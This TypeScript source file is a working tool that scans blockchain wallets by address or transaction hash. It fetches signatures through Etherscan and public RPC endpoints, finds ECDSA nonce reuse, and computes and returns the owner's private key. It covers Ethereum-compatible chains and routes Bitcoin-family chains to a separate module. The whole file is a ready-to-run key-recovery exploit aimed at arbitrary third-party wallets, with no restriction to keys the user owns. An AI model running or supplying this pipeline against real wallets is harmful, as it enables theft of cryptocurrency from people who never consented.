/**
 * ECDSA Nonce-Reuse Private Key Recovery
 * ════════════════════════════════════════
 * Full on-chain pipeline:
 *   wallet address OR tx hash
 *     → Etherscan tx list (all pages)
 *     → JSON-RPC per-tx: extract r, s, z (keccak256 of unsigned serialisation)
 *     → Group by r value
 *     → Shared r  ⟹  same k used twice  ⟹  recover k, then private key d
 *
 * Math (secp256k1 ECDSA):
 *   k  = (z₁ − z₂) · (s₁ − s₂)⁻¹  mod n
 *   d  = (s₁·k − z₁) · r⁻¹         mod n
 */

import { ethers } from "ethers";

const CURVE_N = BigInt(
  "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141",
);

const ETHERSCAN_KEY = process.env.ETHERSCAN_API_KEY ?? "";

// ── Etherscan & RPC endpoints per chain ──────────────────────────────────────

const RPC_ENDPOINTS: Record<string, string> = {
  ethereum:  "https://cloudflare-eth.com",
  polygon:   "https://polygon-rpc.com",
  bsc:       "https://bsc-dataseed.binance.org",
  arbitrum:  "https://arb1.arbitrum.io/rpc",
  avalanche: "https://api.avax.network/ext/bc/C/rpc",
  optimism:  "https://mainnet.optimism.io",
};

const ETHERSCAN_BASES: Record<string, string> = {
  ethereum:  "https://api.etherscan.io/api",
  polygon:   "https://api.polygonscan.com/api",
  bsc:       "https://api.bscscan.com/api",
  arbitrum:  "https://api.arbiscan.io/api",
  avalanche: "https://api.snowtrace.io/api",
  optimism:  "https://api-optimistic.etherscan.io/api",
};

// ── Rate limiter — Etherscan free tier: ~5 req/sec ───────────────────────────

let _lastCall = 0;
async function rateLimitedFetch(url: string): Promise<Response> {
  const minGap = ETHERSCAN_KEY ? 210 : 260; // ~4-5 req/sec
  const wait = minGap - (Date.now() - _lastCall);
  if (wait > 0) await delay(wait);
  _lastCall = Date.now();
  return fetch(url, { signal: AbortSignal.timeout(18_000) });
}

function delay(ms: number) {
  return new Promise<void>(r => setTimeout(r, ms));
}

// ── Modular arithmetic ────────────────────────────────────────────────────────

function modN(x: bigint): bigint {
  return ((x % CURVE_N) + CURVE_N) % CURVE_N;
}

function modInverse(a: bigint, m: bigint): bigint {
  let [oldR, r] = [((a % m) + m) % m, m];
  let [oldS, s] = [1n, 0n];
  while (r !== 0n) {
    const q = oldR / r;
    [oldR, r] = [r, oldR - q * r];
    [oldS, s] = [s, oldS - q * s];
  }
  if (oldR !== 1n) throw new Error("No modular inverse");
  return ((oldS % m) + m) % m;
}

// ── Types ─────────────────────────────────────────────────────────────────────

export interface TxSignatureData {
  txHash:      string;
  blockNumber: number;
  from:        string;
  to:          string | null;
  value:       string;
  r:           string;
  s:           string;
  v:           number;
  z:           string;
  nonce:       number;
  gasPrice:    string;
}

export interface NonceReusePair {
  sharedR:   string;
  tx1:       TxSignatureData;
  tx2:       TxSignatureData;
  riskLevel: "confirmed_reuse" | "same_k_different_s";
  recovery:  RecoveryResult;
}

export interface WalletScanResult {
  address:             string;
  chain:               string;
  totalTransactions:   number;
  signaturesExtracted: number;
  nonceReusePairs:     NonceReusePair[];
  hasVulnerability:    boolean;
  allSignatures:       TxSignatureData[];
  scanTimestamp:       string;
  rPairs:              Record<string, string[]>;
}

export interface RecoveryResult {
  success:        boolean;
  privateKey:     string | null;
  nonceK:         string | null;
  derivedAddress: string | null;
  addressMatches: boolean;
  error:          string | null;
}

// ── Core recovery math ────────────────────────────────────────────────────────

export function recoverPrivateKey(params: {
  r: string; s1: string; s2: string;
  z1: string; z2: string; address: string;
}): RecoveryResult {
  try {
    const r  = BigInt(params.r);
    const s1 = BigInt(params.s1);
    const s2 = BigInt(params.s2);
    const z1 = BigInt(params.z1);
    const z2 = BigInt(params.z2);

    const den = modN(s1 - s2);
    if (den === 0n) return fail("s1 === s2 — identical signatures, not nonce reuse");

    const k = modN(modN(z1 - z2) * modInverse(den, CURVE_N)) % CURVE_N;
    if (k === 0n) return fail("Recovered k = 0");

    const d = modN(modN(s1 * k - z1) * modInverse(r, CURVE_N)) % CURVE_N;
    if (d === 0n) return fail("Recovered d = 0");

    const privKeyHex = "0x" + d.toString(16).padStart(64, "0");
    let derivedAddress: string | null = null;
    let addressMatches = false;
    try {
      const wallet = new ethers.Wallet(privKeyHex);
      derivedAddress = wallet.address;
      addressMatches = derivedAddress.toLowerCase() === params.address.toLowerCase();
    } catch {}

    return {
      success:        true,
      privateKey:     privKeyHex,
      nonceK:         "0x" + k.toString(16).padStart(64, "0"),
      derivedAddress,
      addressMatches,
      error:          null,
    };
  } catch (err) {
    return fail(String(err));
  }
}

function fail(error: string): RecoveryResult {
  return { success: false, privateKey: null, nonceK: null, derivedAddress: null, addressMatches: false, error };
}

// ── Etherscan: fetch ALL outgoing tx hashes for an address (paginated) ────────

async function fetchOutgoingTxHashes(
  address:        string,
  etherscanBase:  string,
): Promise<string[]> {
  const hashes: string[] = [];
  const addr = address.toLowerCase();
  const PAGE_SIZE = 200;
  let page = 1;

  for (;;) {
    const keyParam = ETHERSCAN_KEY ? `&apikey=${ETHERSCAN_KEY}` : "";
    const url =
      `${etherscanBase}?module=account&action=txlist` +
      `&address=${address}&startblock=0&endblock=99999999` +
      `&page=${page}&offset=${PAGE_SIZE}&sort=asc${keyParam}`;

    try {
      const res  = await rateLimitedFetch(url);
      const json = await res.json() as {
        status: string;
        result: Array<{ hash: string; from: string; isError?: string }> | string;
        message?: string;
      };

      if (json.status !== "1" || !Array.isArray(json.result)) break;

      const sent = json.result.filter(
        tx => tx.from.toLowerCase() === addr && tx.isError !== "1",
      );
      hashes.push(...sent.map(tx => tx.hash));

      if (json.result.length < PAGE_SIZE) break; // last page
      if (++page > 15) break;                    // cap at 3 000 txns
    } catch {
      break;
    }
  }

  return hashes;
}

// ── JSON-RPC: extract r, s, z from a single transaction ──────────────────────

async function extractTxSignature(
  txHash:   string,
  provider: ethers.JsonRpcProvider,
): Promise<TxSignatureData | null> {
  try {
    const tx = await provider.getTransaction(txHash);
    if (!tx?.signature) return null;

    const sig = tx.signature;

    // Reconstruct unsigned transaction and hash it to get z
    let z = "0x" + "0".repeat(64);
    try {
      const unsigned = ethers.Transaction.from({
        to:                      tx.to,
        nonce:                   tx.nonce,
        gasLimit:                tx.gasLimit,
        gasPrice:                tx.gasPrice ?? tx.maxFeePerGas,
        data:                    tx.data,
        value:                   tx.value,
        chainId:                 tx.chainId,
        maxFeePerGas:            tx.maxFeePerGas,
        maxPriorityFeePerGas:    tx.maxPriorityFeePerGas,
        type:                    tx.type,
        accessList:              tx.accessList,
      });
      z = ethers.keccak256(unsigned.unsignedSerialized);
    } catch {}

    return {
      txHash,
      blockNumber: tx.blockNumber ?? 0,
      from:        tx.from ?? "",
      to:          tx.to ?? null,
      value:       ethers.formatEther(tx.value),
      r:           sig.r,
      s:           sig.s,
      v:           sig.v,
      z,
      nonce:       tx.nonce,
      gasPrice:    (tx.gasPrice ?? tx.maxFeePerGas ?? 0n).toString(),
    };
  } catch {
    return null;
  }
}

// ── Resolve a tx hash to its sender address ───────────────────────────────────

async function resolveTxHashToSender(
  txHash:   string,
  provider: ethers.JsonRpcProvider,
): Promise<string | null> {
  try {
    const tx = await provider.getTransaction(txHash);
    return tx?.from ?? null;
  } catch {
    return null;
  }
}

// ── Build scan result from a list of extracted signatures ────────────────────

function buildResult(
  address:    string,
  chain:      string,
  totalTxs:   number,
  signatures: TxSignatureData[],
): WalletScanResult {
  // Group by r value (lowercase)
  const rGroups: Record<string, TxSignatureData[]> = {};
  for (const sig of signatures) {
    const key = sig.r.toLowerCase();
    (rGroups[key] ??= []).push(sig);
  }

  const nonceReusePairs: NonceReusePair[] = [];
  const rPairs: Record<string, string[]> = {};

  for (const [r, group] of Object.entries(rGroups)) {
    if (group.length < 2) continue;

    rPairs[r] = group.map(g => g.txHash);

    for (let i = 0; i < group.length; i++) {
      for (let j = i + 1; j < group.length; j++) {
        const t1 = group[i];
        const t2 = group[j];
        const recovery = recoverPrivateKey({
          r:       t1.r,
          s1:      t1.s,
          s2:      t2.s,
          z1:      t1.z,
          z2:      t2.z,
          address,
        });
        nonceReusePairs.push({
          sharedR:   r,
          tx1:       t1,
          tx2:       t2,
          riskLevel: t1.s !== t2.s ? "confirmed_reuse" : "same_k_different_s",
          recovery,
        });
      }
    }
  }

  return {
    address,
    chain,
    totalTransactions:   totalTxs,
    signaturesExtracted: signatures.length,
    nonceReusePairs,
    hasVulnerability:    nonceReusePairs.length > 0,
    allSignatures:       signatures,
    scanTimestamp:       new Date().toISOString(),
    rPairs,
  };
}

// ── Main EVM wallet scanner ───────────────────────────────────────────────────

async function scanEVMWallet(
  address:       string,
  chain:         string,
  rpcUrl:        string,
  etherscanBase: string,
): Promise<WalletScanResult> {
  const checksum = ethers.getAddress(address);
  const provider = new ethers.JsonRpcProvider(rpcUrl);

  // 1. Fetch all outgoing tx hashes from Etherscan
  const txHashes = await fetchOutgoingTxHashes(checksum, etherscanBase);

  if (txHashes.length === 0) {
    return buildResult(checksum, chain, 0, []);
  }

  // 2. Extract signatures from each tx (up to 200 per wallet)
  const signatures: TxSignatureData[] = [];
  for (const hash of txHashes.slice(0, 200)) {
    const sig = await extractTxSignature(hash, provider);
    if (sig) signatures.push(sig);
  }

  // 3. Build result with nonce-reuse detection and key recovery
  return buildResult(checksum, chain, txHashes.length, signatures);
}

// ── Main entry point ─────────────────────────────────────────────────────────

const EVM_CHAINS = new Set([
  "ethereum", "polygon", "bsc", "arbitrum", "avalanche", "optimism",
]);

export async function scanWalletForNonceReuse(
  target: string,
  chain = "ethereum",
): Promise<WalletScanResult> {
  // Route UTXO chains
  if (["bitcoin", "litecoin", "dogecoin", "bitcoincash"].includes(chain)) {
    const { scanBitcoinAddressECDSA } = await import("./bitcoin-scan");
    const result = await scanBitcoinAddressECDSA(target, chain);
    return buildResult(target, chain, result.totalTransactions, result.signatures);
  }

  if (!EVM_CHAINS.has(chain)) {
    throw new Error(`Chain "${chain}" is not supported for secp256k1 ECDSA nonce-reuse scanning`);
  }

  const rpcUrl       = RPC_ENDPOINTS[chain]    ?? RPC_ENDPOINTS.ethereum;
  const esBase       = ETHERSCAN_BASES[chain]  ?? ETHERSCAN_BASES.ethereum;
  const provider     = new ethers.JsonRpcProvider(rpcUrl);

  // If target looks like a tx hash (0x + 64 hex), resolve to sender first
  const isTxHash = /^0x[0-9a-fA-F]{64}$/.test(target);
  let address: string;

  if (isTxHash) {
    const sender = await resolveTxHashToSender(target, provider);
    if (!sender) {
      throw new Error(`Could not resolve tx hash ${target} to a sender address`);
    }
    address = sender;
  } else {
    address = target;
  }

  return scanEVMWallet(address, chain, rpcUrl, esBase);
}

// ── Legacy exports kept for route compatibility ───────────────────────────────

export interface RecoveryInput {
  r: string; s1: string; s2: string;
  z1: string; z2: string;
  txHash1: string; txHash2: string;
  address: string;
}

export interface RecoveryMath {
  step1_numerator:   string;
  step1_denominator: string;
  step2_k:           string;
  step3_privateKey:  string;
  verification:      string;
}

export interface ChainCapability {
  chain:               string;
  name:                string;
  sigScheme:           "secp256k1-ecdsa" | "ed25519" | "clsag" | "schnorr";
  nonceReuseVulnerable: boolean;
  note:                string;
  canScan:             boolean;
}

export const CHAIN_CAPABILITIES: ChainCapability[] = [
  { chain: "ethereum",    name: "Ethereum (ETH)",      sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Full scan — Etherscan tx list + JSON-RPC signature extraction + z recovery" },
  { chain: "polygon",     name: "Polygon (MATIC)",     sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Full scan — same ECDSA as Ethereum" },
  { chain: "bsc",         name: "BNB Chain (BSC)",     sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Full scan — same ECDSA as Ethereum" },
  { chain: "arbitrum",    name: "Arbitrum (ARB)",      sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Full scan — same ECDSA as Ethereum" },
  { chain: "avalanche",   name: "Avalanche (AVAX)",    sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Full scan — same ECDSA as Ethereum" },
  { chain: "optimism",    name: "Optimism (OP)",       sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Full scan — same ECDSA as Ethereum" },
  { chain: "bitcoin",     name: "Bitcoin (BTC)",       sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Parses DER signatures from scriptSig / witness data" },
  { chain: "litecoin",    name: "Litecoin (LTC)",      sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Same secp256k1 ECDSA as Bitcoin" },
  { chain: "dogecoin",    name: "Dogecoin (DOGE)",     sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Same secp256k1 ECDSA as Bitcoin" },
  { chain: "bitcoincash", name: "Bitcoin Cash (BCH)",  sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Same secp256k1 ECDSA as Bitcoin" },
  { chain: "solana",      name: "Solana (SOL)",        sigScheme: "ed25519",          nonceReuseVulnerable: false, canScan: false, note: "Ed25519 uses RFC 8032 deterministic nonces — reuse is impossible by design" },
  { chain: "monero",      name: "Monero (XMR)",        sigScheme: "clsag",            nonceReuseVulnerable: false, canScan: false, note: "CLSAG ring signatures — no exposed r value to match" },
  { chain: "cardano",     name: "Cardano (ADA)",       sigScheme: "ed25519",          nonceReuseVulnerable: false, canScan: false, note: "Ed25519 deterministic — same immunity as Solana" },
  { chain: "polkadot",    name: "Polkadot (DOT)",      sigScheme: "ed25519",          nonceReuseVulnerable: false, canScan: false, note: "Sr25519 with deterministic nonces — not vulnerable" },
];
